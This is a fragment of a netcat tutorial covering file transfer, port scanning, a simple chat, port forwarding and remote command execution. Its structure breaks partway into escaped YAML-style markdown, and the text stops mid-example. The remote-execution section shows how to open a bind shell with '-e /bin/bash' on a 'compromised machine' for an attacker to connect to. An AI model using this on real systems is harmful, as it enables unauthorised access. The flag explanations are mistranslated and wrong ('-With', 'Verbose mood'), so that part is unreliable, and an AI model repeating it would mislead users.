    # # File transference


    Netcat can be used to transfer files between two machines quickly and efficiently.


    # ## Example of use:


    +   1. On the source system, run:


    ```

    bash

    nc -l 1234 < /path/to/file

    ```


    +   2. On the target system, run:


    ```

    bash

    nc <source_system_IP> 1234 > /path/to/save/file

    ```


    # ## Port Scanning


    Netcat can perform port scans to check the availability of services on a remote
    machine.


    # ## Example of use:


    ```

    bash

    nc -zv <destination_IP> 20-80

    ```


    Explanation:


    +   - -With: Uses scan mode without sending data.

    - -in: Verbose mood.

    - 20-80: Range of ports to be scanned.'
- md: "\n# Simple Chat\n\nNetcat can be used to create a simple chat between two machines.\n\
    \n# Example of use:\n\n- 1. On the machine that will act as the server, run:\n\
    \n```\nnc -l -p 1234\n```\n\n- 2. On the client machine, run:\n\n```\nnc <server_ip>\
    \ 1234\n```\n\n# Advanced Usage\n\n## Port Forwarding\n\nNetcat can be used to\
    \ redirect ports, creating tunnels between different services and networks.\n\n\
    # Example of use:\n\n- 1. Redirect a local port to a remote service:\n\n```\n\
    mkfifo /tmp/fifo\nnc -l -p 1234 < /tmp/fifo | nc <IP_destino> 5678 > /tmp/fifo\n\
    ```\n\n## Remote Command Execution\n\nNetcat can be used to remotely execute commands\
    \ on a compromised machine.\n\n# Example of use:\n\n- 1. On the compromised machine,\
    \ run:\n\n```\nnc -l -p 1234 -e /bin/bash\n```\n\n- 2. On the attacking machine,\
    \ run:\n\n```\nnc <compromised_machine_IP> 1234\n```\n\n# Practical examples\n\
    \n## Example 1: File Transfer\n\n- 1. On the source system:\n\n```\nnc -l -p 1234\
